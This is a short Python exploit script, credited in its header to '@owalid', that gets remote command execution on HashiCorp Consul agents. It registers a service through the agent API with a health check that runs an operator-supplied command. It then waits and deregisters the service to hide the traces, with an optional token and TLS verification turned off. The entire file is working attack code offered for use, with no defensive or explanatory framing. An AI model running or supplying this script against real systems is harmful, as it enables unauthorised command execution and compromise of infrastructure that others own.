'''
- Author:      @owalid
- Description: This script exploits a command injection vulnerability in Consul
'''
import requests
import argparse
import time
import random
import string

def get_random_string():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(15))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-th", "--target_host", help="Target Host (REQUIRED)", type=str, required=True)
    parser.add_argument("-tp", "--target_port", help="Target Port (REQUIRED)", type=str, required=True)
    parser.add_argument("-c", "--command", help="Command to execute (REQUIRED)", type=str, required=True)
    parser.add_argument("-s", "--ssl", help="SSL", type=bool, required=False, default=False)
    parser.add_argument("-ct", "--consul-token", help="Consul Token", type=str, required=False)

    args = parser.parse_args()
    protocol = "https" if args.ssl else "http"
    url = f"{protocol}://{args.target_host}:{args.target_port}"
    consul_token = args.consul_token
    command = args.command
    headers = {'X-Consul-Token': consul_token} if consul_token else {}
    
    command_list = command.split(" ")
    id = get_random_string()

    data = {
        'ID': id,
        'Name': 'pwn',
        'Address': '127.0.0.1',
        'Port': 80,
        "Check": {
            "DeregisterCriticalServiceAfter": "90m",
            "Args": command_list,
            'Interval': '10s',
            "Timeout": "86400s",
        }
    }

    registerurl= f"{url}/v1/agent/service/register?replace-existing-checks=true"

    r = requests.put(registerurl, json=data, headers=headers, verify=False)

    if r.status_code != 200:
        print(f"[-] Error creating check {id}")
        print(r.text)
        exit(1)

    print(f"[+] Check {id} created successfully")
    time.sleep(12)
    desregisterurl = f"{url}/v1/agent/service/deregister/{id}"
    r = requests.put(desregisterurl, headers=headers, verify=False)

    if r.status_code != 200:
        print(f"[-] Error deregistering check {id}")
        print(r.text)
        exit(1)
    
    print(f"[+] Check {id} deregistered successfully")
